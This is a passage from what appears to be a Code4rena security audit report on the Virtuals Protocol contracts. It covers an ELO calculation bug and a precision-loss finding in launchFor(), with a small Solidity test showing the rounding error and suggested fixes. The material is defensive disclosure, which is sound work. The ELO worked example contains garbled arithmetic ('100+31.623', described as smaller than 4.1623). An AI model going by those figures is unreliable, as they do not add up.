400))\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eCode error steps - the contract attempts to optimize the calculation by factoring the exponent, but introduces a fatal error:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"122\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003en = _negative ? 800 - ratingDiff: 800 + ratingDiff;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e_powered = fp.rpow(10, n / 25, 1); // calculate10^(n/25)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003epowered = sixteenthRoot(_powered); // The fourth square root → is equivalent to10^(n/(25 * 16)) = 10^(n/400)\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eOn the surface, the math is equivalent to \u003ccode\u003e10^(ratingDiff/400)\u003c/code\u003e, but the ​​offset of 800​​ completely breaks the logic.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e2. Sign error caused by offset\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eExample analysis - Assume that \u003ccode\u003eRA=1000\u003c/code\u003e, \u003ccode\u003eRB=800\u003c/code\u003e, then:\u003c/p\u003e\n\u003cp\u003eCorrect case -  The exponent is \u003ccode\u003e(1000−800)/400=0.5\u003c/code\u003e, and the denominator is \u003ccode\u003e1+10^0.5≈4.1623\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003eCode calculation​​:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"123\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eratingDiff = 200, _negative = true\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003en = 800 - 200 = 600\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003en/25 = 24 → 10 ^24\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eFourth square root → 10 ^(24/16)=10^1.5≈31.623\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eThe denominator becomes 100+31.623=131.623, which is much smaller than the correct value 4.1623. \u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003eResults:\u003c/strong\u003e expected score was incorrectly inflated, causing a complete distortion in the ELO change calculation.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e3. Summary of the root causes of the error\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eWrong offset:\u003c/strong\u003e The introduction of \u003ccode\u003e800 ± ratingDiff\u003c/code\u003e has no mathematical basis, resulting in double errors in the exponent sign and magnitude.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eDecomposition steps are incompatible with integer operations:\u003c/strong\u003e the correct decomposition should be \u003ccode\u003e10^ratingDiff/400 = (10^ratingDiff/25)^1/16\u003c/code\u003e. But after \u003ccode\u003en\u003c/code\u003e was incorrectly offset in the code, the actual calculation of \u003ccode\u003e10^(800±ratingDiff)/(25×16)\u003c/code\u003e is equivalent to \u003ccode\u003e10^(800±ratingDiff)/400\u003c/code\u003e, which is completely deviated from the original formula.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eSign processing is reversed:\u003c/strong\u003e when \u003ccode\u003eRA\u003eRB\u003c/code\u003e, the exponent should be positive, but the offset in the code makes it become \u003ccode\u003e(800−ratingDiff)/400\u003c/code\u003e, resulting in the reverse calculation of the denominator.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003eVirtuals marked as informative\u003c/strong\u003e\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-26-imprecise-calculations-in-launchfor-lead-to-less-liquidity-be-added-to-the-pair-via-the-router\" style=\"position:relative;\"\u003e\u003ca href=\"#m-26-imprecise-calculations-in-launchfor-lead-to-less-liquidity-be-added-to-the-pair-via-the-router\" aria-label=\"m 26 imprecise calculations in launchfor lead to less liquidity be added to the pair via the router permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-278\"\u003e[M-26] Imprecise calculations in \u003ccode\u003elaunchFor()\u003c/code\u003e lead to less liquidity be added to the pair via the router\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-817\"\u003eMatin\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-760\"\u003ecodexNature\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/main/contracts/fun/Bonding.sol#L215-L216\"\u003ehttps://github.com/code-423n4/2025-04-virtuals-protocol/blob/main/contracts/fun/Bonding.sol#L215-L216\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-and-impact-9\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-and-impact-9\" aria-label=\"finding description and impact 9 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description and impact\u003c/h3\u003e\n\u003cp\u003eSolidity rounds down the result of an integer division, and because of that, it is always recommended to multiply before dividing to avoid that precision loss. The problem arises in the Bonding.sol’s \u003ccode\u003elaunchFor()\u003c/code\u003e function where the \u003ccode\u003eliquidity\u003c/code\u003e is calculated:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"124\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003elaunchFor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estring\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_name\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estring\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_ticker\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint8\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecores\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estring\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edesc\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estring\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eimg\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estring\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e4\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eurls\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epurchaseAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecreator\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    ) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003enonReentrant\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// code\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ek\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = ((\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eK\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) / \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eassetRate\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eliquidity\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = (((\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ek\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eether\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) / \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esupply\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) * \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eether\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) / \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eAlthough this model is implemented to calculate the \u003ccode\u003ek\u003c/code\u003e, we can see there is a hidden division before a multiplication that makes round down the whole expression. This is bad as the precision loss can be significant, which leads to the pool calculating less \u003ccode\u003eliquidity\u003c/code\u003e than actual.\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps-30\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-30\" aria-label=\"recommended mitigation steps 30 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eConsider changing the \u003ccode\u003eliquidity\u003c/code\u003e calculation in the way that prioritize the multiplication over division or use the high precision fixed point math libraries (e.g. PRB math lib).\u003c/p\u003e\n\u003ch3 id=\"proof-of-concept-19\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept-19\" aria-label=\"proof of concept 19 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of Concept\u003c/h3\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"125\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003econstant\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eK\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e3_000_000_000_000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003etestPrecisionLoss\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eassetRate\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esupply\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    ) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epure\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eact\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eacc\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ek\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = ((\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eK\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) / \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eassetRate\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eact\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = (((\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ek\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eether\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) / \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esupply\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) * \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eether\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) / \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eacc\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eK\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eether\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eether\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) / (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eassetRate\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esupply\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eFor the \u003ccode\u003eassetRate\u003c/code\u003e and \u003ccode\u003esupply\u003c/code\u003e equal to (\u003ccode\u003e7.98e15\u003c/code\u003e, \u003ccode\u003e1.9283e18\u003c/code\u003e):\u003c/p\u003e\n\u003cp\u003eThe result would be:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"126\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e     Current Implementation  1555700000000000000\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e     Actual Implementation   1949592125831354822\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis is equal to \u003ccode\u003e~25%\u003c/code\u003e relative error. Also, it is worth to mention that in some cases even the liquidity becomes zero. For the \u003ccode\u003eassetRate\u003c/code\u003e and \u003ccode\u003esupply\u003c/code\u003e equal to (\u003ccode\u003e1e18\u003c/code\u003e, \u003ccode\u003e2e18\u003c/code\u003e), the result would be:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"127\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e     Current Implementation  0\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e     Actual Implementation   15000000000000000\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003chr\u003e\n\u003ch1 id=\"low-risk-and-non-critical-issues\" style=\"position:relative;\"\u003e\u003ca href=\"#low-risk-and-non-critical-issues\" aria-label=\"low risk and non critical issues permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eLow Risk and Non-Critical Issues\u003c/h1\u003e\n\u003cp\u003eFor this audit, 38 reports were submitted by wardens detailing low risk and non-critical issues. The \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-853\"\u003ereport highlighted below\u003c/a\u003e by \u003cstrong\u003eSparrow\u003c/strong\u003e received the top score from the judge.\u003c/p\u003e\n\u003cp\u003e\u003cem\u003eThe following wardens also submitted reports: \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-759\"\u003e0xdonchev\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-811\"\u003e0xhp9\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-402\"\u003ealessio\u003c/a\u003e, \u003ca 